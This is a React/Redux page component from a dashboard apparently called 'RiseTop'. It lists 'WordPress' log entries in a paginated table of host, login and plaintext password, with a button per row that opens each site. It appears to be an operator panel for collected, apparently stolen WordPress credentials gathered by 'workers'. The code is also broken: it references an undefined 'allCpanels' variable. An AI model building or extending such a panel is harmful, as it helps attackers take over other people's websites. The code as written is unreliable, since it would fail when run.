import React, { useEffect, useState } from 'react';
import ReactPaginate from 'react-paginate';

import { connect } from 'react-redux';
import { getOwnAllWordpress } from '../../store/actions/logs.actions'

import languagesTranslate from '../../common/languages'

export default connect((s) => ({
  user: s.user.state,
  allWordpress: s.logs.wordpress,
}), {
  getOwnAllWordpress
})(
  ({
    CurrentLanguage_G,

    user,
    allWordpress,

    getOwnAllWordpress
  }) => {
    const [CurrentPage, changeCurrentPage] = useState(1)
    const [Wordpress, changeWordpress] = useState([])

    const handlePageChange = (page) => {

      changeCurrentPage(page);

      if (allWordpress.state.length != allWordpress.all && CurrentPage == (Wordpress.length / 50) - 1)
        getOwnAllWordpress({
          token: user.token,
          from: allWordpress.state.length
        })

    }

    useEffect(() => {
      let _allWordpress = [];

      for (let i = 0; i < allWordpress.state.length; i++)
        _allWordpress = [..._allWordpress, ...allWordpress.state[i].wordpress.map(v => ({ id: allWordpress.state[i].id, value: v }))]

      changeWordpress(_allWordpress)

    }, [allWordpress.state])

    return (
      <section className="content">
        <div className="body_scroll">
          <div className="block-header">
            <div className="row">
              <div className="col-lg-7 col-md-6 col-sm-12">
                <h2>{languagesTranslate[CurrentLanguage_G].allWordpressPage.header}</h2>
                <ul className="breadcrumb">
                  <li className="breadcrumb-item"><a href="index.html"><i className="zmdi zmdi-home"></i> RiseTop</a>
                  </li>
                  <li className="breadcrumb-item">{languagesTranslate[CurrentLanguage_G].allWordpressPage.pathItem1}</li>
                  <li className="breadcrumb-item active">{languagesTranslate[CurrentLanguage_G].allWordpressPage.pathItem2}</li>
                </ul>
                <button className="btn btn-primary btn-icon mobile_menu" type="button"><i
                  className="zmdi zmdi-sort-amount-desc"></i></button>
              </div>
            </div>
          </div>

          <div class="container-fluid">
            <div class="row clearfix">
              <div class="col-lg-12 col-md-12">
                <div class="card">
                  <div class="header">
                    <h2><strong>{languagesTranslate[CurrentLanguage_G].allWordpressPage.wordpress}</strong></h2>
                  </div>
                  <div class="body">
                    <div className="row">
                      <div className="col-6">
                        <div className="w-100 h-100 d-flex align-items-center">
                          <span className={'text-muted'}>{languagesTranslate[CurrentLanguage_G].allWordpressPage.show(((CurrentPage - 1) * 50) + 1, CurrentPage * 50, Wordpress.length)}</span>
                        </div>
                      </div>
                      <div className="col-6">
                        <ReactPaginate
                          previousLinkClassName={'btn btn-secondary previous'}
                          previousLabel={languagesTranslate[CurrentLanguage_G].WorkersLogsPage.previous}
                          nextLinkClassName={'btn btn-secondary next'}
                          nextLabel={languagesTranslate[CurrentLanguage_G].WorkersLogsPage.next}
                          breakLabel={'...'}
                          breakClassName={'break-me'}
                          pageCount={Math.ceil(allWordpress.all / 50)}
                          marginPagesDisplayed={2}
                          pageRangeDisplayed={5}
                          onPageChange={(page) => handlePageChange(page.selected + 1)}
                          containerClassName={'pagination justify-content-end'}
                          activeClassName={'active'}
                          pageLinkClassName={'num'}
                        />
                      </div>
                    </div>
                    <table class="table table-bordered">
                      <thead>
                        <tr>
                          <th>{languagesTranslate[CurrentLanguage_G].allWordpressPage.id}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allWordpressPage.host}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allWordpressPage.login}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allWordpressPage.password}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allWordpressPage.logIn}</th>
                        </tr>
                      </thead>
                      <tbody>
                        {
                          Wordpress.map((v, i) =>
                            i < CurrentPage * allCpanels.filter.ShowOnPage && i >= (CurrentPage - 1) * allCpanels.filter.ShowOnPage
                              ? <tr key={i}>
                                <td className={'text-center'}>
                                  {v.id}
                                </td >
                                <td className={'text-center'}>
                                  {v.value.host}
                                </td >
                                <td className={'text-center'}>
                                  {v.value.login}
                                </td >
                                <td className={'text-center'}>
                                  {v.value.password}
                                </td >
                                <td className={'text-center'}>
                                  <a href={v.value.host} target={"_blank"}>
                                    <button type="button" class="btn btn-primary mt-0 mb-0 h-100">
                                      <span class="btn-label">
                                        <i class="zmdi zmdi-sign-in"></i>
                                      </span>
                                    </button>
                                  </a>
                                </td >
                              </tr>
                              : null
                          )
                        }
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
            </div>
          </div>

        </div>
      </section >
    )

  }
);